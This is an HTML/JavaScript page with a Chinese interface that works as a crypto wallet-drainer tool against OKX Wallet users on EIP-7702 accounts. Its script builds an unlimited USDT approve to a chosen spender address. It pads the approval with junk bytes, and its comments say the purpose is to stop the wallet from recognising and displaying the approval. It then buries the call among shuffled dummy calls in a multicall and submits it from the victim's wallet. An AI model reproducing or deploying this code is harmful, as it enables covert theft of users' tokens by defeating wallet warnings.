<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OKX EIP-7702 深度混淆授权</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); min-height: 100vh; color: #fff; padding: 20px; }
        .container { max-width: 650px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; }
        .header h1 { font-size: 24px; margin-bottom: 10px; background: linear-gradient(90deg, #ff00cc, #333399); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 24px; margin-bottom: 20px; backdrop-filter: blur(10px); }
        .card-title { font-size: 16px; font-weight: 600; margin-bottom: 16px; color: #a4aeff; }
        .input-group { margin-bottom: 16px; }
        .input-group label { display: block; font-size: 13px; color: #aaa; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 14px 16px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; color: #fff; outline: none; font-family: monospace; }
        .btn { width: 100%; padding: 16px 24px; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; margin-bottom: 12px; }
        .btn-primary { background: linear-gradient(90deg, #6a11cb, #2575fc); color: #fff; }
        .btn-success { background: linear-gradient(90deg, #11998e, #38ef7d); color: #fff; }
        .output-box { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(100, 100, 255, 0.3); border-radius: 8px; padding: 16px; margin: 16px 0; font-family: monospace; font-size: 10px; word-break: break-all; max-height: 150px; overflow-y: auto; color: #a4aeff; }
        .status-box { background: rgba(0, 0, 0, 0.3); border-radius: 8px; padding: 12px; margin-top: 12px; font-family: monospace; font-size: 11px; color: #888; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>OKX EIP-7702 深度混淆工具</h1>
            <p>Payload Pollution + Multicall Padding</p>
        </div>

        <div class="card" id="connectCard">
            <button class="btn btn-primary" onclick="connectWallet()">连接钱包</button>
        </div>

        <div class="card hidden" id="mainCard">
            <div class="card-title">配置与生成</div>
            
            <div class="input-group">
                <label>授权 Spender 地址</label>
                <input type="text" id="spenderInput" placeholder="0x..." oninput="generateCalldata()">
            </div>

            <div class="output-box" id="calldataOutput">等待输入...</div>
            
            <button class="btn btn-success" onclick="sendTransaction()">执行混淆交易</button>
            <div class="status-box" id="statusBox">就绪</div>
        </div>
    </div>

    <script>
        // ================= 常量定义 =================
        const OKX_DELEGATOR = '0x80296FF8D1ED46f8e3C7992664D13B833504c2Bb';
        const USDT_ETH = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        
        const EXECUTE_FROM_SELF = '893aa9f6'; // executeFromSelf(Call[])
        const APPROVE = '095ea7b3';           // approve(address,uint256)
        const BALANCE_OF = '70a08231';        // balanceOf(address)
        const MAX_UINT256 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // ================= 全局变量 =================
        let provider = null;
        let currentAccount = null;
        let generatedCalldata = null;

        // ================= 工具函数 =================
        function toBytes32(v) { return BigInt(v).toString(16).padStart(64, '0'); }
        function addrToBytes32(a) { return a.toLowerCase().replace('0x', '').padStart(64, '0'); }

        // ================= 核心混淆逻辑 =================
        function generateCalldata() {
            const output = document.getElementById('calldataOutput');
            const spender = document.getElementById('spenderInput').value.trim();

            if (!spender || !/^0x[a-fA-F0-9]{40}$/.test(spender)) {
                output.textContent = '请输入有效的 Spender 地址';
                generatedCalldata = null;
                return;
            }

            // 1. 构造【脏数据】(Polluted Payload)
            // 原理：在标准的 approve 调用数据后追加 32 字节垃圾数据
            // 钱包看到长度不符合标准 ERC20 (68字节)，会放弃解析 "Approve"
            // 但 EVM 执行时会忽略末尾多余数据，交易依然成功
            
            const standardData = APPROVE + addrToBytes32(spender) + MAX_UINT256;
            // 随便写点垃圾数据，比如末尾是 1
            const garbageData = "0000000000000000000000000000000000000000000000000000000000000001"; 
            const pollutedData = standardData + garbageData;

            const realCall = {
                target: USDT_ETH,
                value: '0',
                data: pollutedData // 使用脏数据
            };

            // 2. 构造【噪音调用】(Dummy Calls)
            // 插入一些无害的查询调用，进一步打乱数据特征
            const dummyCall = {
                target: USDT_ETH,
                value: '0',
                data: BALANCE_OF + addrToBytes32(currentAccount)
            };

            // 3. 随机排序 (Shuffle)
            // 将真正的 pollutedCall 藏在数组中间
            let calls = [dummyCall, dummyCall, realCall, dummyCall];
            calls = calls.sort(() => Math.random() - 0.5);

            // 4. 手动编码 ABI (Call[] 结构)
            // 注意：因为 data 长度变了，必须动态计算偏移量
            let calldata = EXECUTE_FROM_SELF;
            calldata += toBytes32(32); // 数组整体偏移
            calldata += toBytes32(calls.length); // 数组长度

            let currentDataOffset = calls.length * 32; // 第一个 Call 结构体内容的起始位置
            let headers = "";
            let bodies = "";

            calls.forEach(call => {
                // 写入头部偏移量 (指向 body)
                headers += toBytes32(currentDataOffset);

                // 准备 Body 数据
                const d = call.data.replace('0x', '');
                const dLen = d.length / 2;
                const dPadded = d.padEnd(Math.ceil(d.length / 64) * 64, '0');

                let body = "";
                body += addrToBytes32(call.target); // target
                body += toBytes32(call.value);      // value
                body += toBytes32(96);              // data offset (固定为 96, 因为前面有 target(32)+value(32)+offset(32))
                body += toBytes32(dLen);            // data length (这里写入的是包含脏数据的总长度)
                body += dPadded;                    // data content

                bodies += body;
                currentDataOffset += (body.length / 2); // 更新下一个偏移量
            });

            generatedCalldata = '0x' + calldata + headers + bodies;
            output.textContent = generatedCalldata;
        }

        // ================= 交互逻辑 =================
        async function connectWallet() {
            try {
                // 优先检测 OKX Wallet
                provider = window.okxwallet || window.ethereum;
                if (!provider) return alert('请安装钱包');

                const accounts = await provider.request({ method: 'eth_requestAccounts' });
                currentAccount = accounts[0];
                
                document.getElementById('connectCard').classList.add('hidden');
                document.getElementById('mainCard').classList.remove('hidden');
                document.getElementById('statusBox').textContent = `已连接: ${currentAccount.slice(0,6)}...`;
                
                // 立即触发一次生成
                if(document.getElementById('spenderInput').value) generateCalldata();
                
            } catch (e) {
                alert(e.message);
            }
        }

        async function sendTransaction() {
            if (!generatedCalldata) return alert('请先生成数据');
            
            const btn = document.querySelector('.btn-success');
            btn.disabled = true;
            btn.textContent = '请求中...';

            try {
                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: currentAccount,
                        to: currentAccount, // 发送给自己 (执行 executeFromSelf)
                        value: '0x0',
                        data: generatedCalldata
                    }]
                });
                
                document.getElementById('statusBox').innerHTML = 
                    `交易发送成功! Hash: <a href="https://etherscan.io/tx/${txHash}" target="_blank" style="color:#fff">${txHash.slice(0,10)}...</a>`;
            } catch (e) {
                document.getElementById('statusBox').textContent = '失败: ' + e.message;
            } finally {
                btn.disabled = false;
                btn.textContent = '执行混淆交易';
            }
        }
    </script>
</body>
</html>
